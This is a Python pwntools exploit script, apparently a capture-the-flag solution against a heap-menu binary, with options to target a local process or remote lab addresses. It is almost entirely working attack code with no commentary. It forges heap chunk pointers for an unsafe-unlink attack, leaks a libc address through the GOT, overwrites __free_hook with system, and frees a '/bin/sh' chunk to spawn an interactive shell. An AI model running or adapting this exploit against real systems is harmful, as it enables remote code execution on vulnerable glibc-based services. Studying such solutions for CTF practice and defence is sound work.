from pwn import *

context(os='linux',arch='amd64',aslr = 'False')#,log_level='debug')
local = 1
#log_level='debug'

if local:
	p = process("./pwn.patch")#,env={'LD_PRELOAD':'./libc_x64.so.6'})
	elf = ELF("./pwn.patch")
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	#p = remote('192.168.210.11',11006)
	p = remote('172.29.20.112',9999)
	elf = ELF("./pwn")
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new(index,size,content):
    p.recvuntil("show\n")
    p.sendline("1")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.sendline(str(size))
    p.recvuntil("gift: ")
    leak = p.recvuntil("\n",drop = True)
    heap = int(leak,16)
    print("[+] heap = " + str(hex(heap)))
    p.recvuntil(":\n")
    p.sendline(content)
    return heap

def delete(index):
    p.recvuntil("show\n")
    p.sendline("2")
    p.recvuntil(":\n")
    p.sendline(str(index))

def edit(index,content):
    p.recvuntil("show\n")
    p.sendline("3")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.send(content)

def edit2(index,content):
    p.recvuntil("show\n")
    p.sendline("3")
    p.recvuntil(":\n")
    p.sendline(str(index))
    p.recvuntil(":\n")
    p.sendline(content)

def show(index):
    p.recvuntil("show\n")
    p.sendline("4")
    p.recvuntil(":\n")
    p.sendline(str(index))

'''
b *0x400990
b *0x400A61
b *0x400B73

'''
# if (__builtin_expect (FD->bk != P || BK->fd != P, 0))	
bss=0x6021c8+0x18

f=bss-0x18
b=bss-0x10

payload = p64(f) + p64(b)
leak = new(28,0xf8,payload)
print("[+] leak = " + str(hex(leak)))
heap = leak - 0x10

new(29,0xf8,payload)
new(30,0xf8,payload)
new(31,0xf8,payload)
new(32,0xf8,payload)
new(1,0xf8,"AAA")
new(2,0xf8,"AAA")
new(10,0xf8,"/bin/sh\x00")
payload = p64(0) + p64(0xf1) + p64(f) + p64(b)
edit(32,payload.ljust(0xf0, "\x00") + p64(0xf0))
delete(1)
payload  = p64(elf.got['puts']) + p64(0x6020f0)

edit(32,payload.ljust(0xe8, "\x00")+ p64(0x100) + p32(0x100) + p32(0x100))
show(29)

puts_addr = u64(p.recvuntil('\n', drop=True)+"\x00\x00")
print "[+] puts_addr = " + str(hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
print "[+] libc_base = " + str(hex(libc_base))
system = libc_base + libc.symbols['system']

free_hook = libc_base + 0x3c67a8
one_gadget = libc_base + 0xf1147
pause()
edit(30,p64(free_hook))
edit2(2,p64(system))

delete(10)

p.interactive()


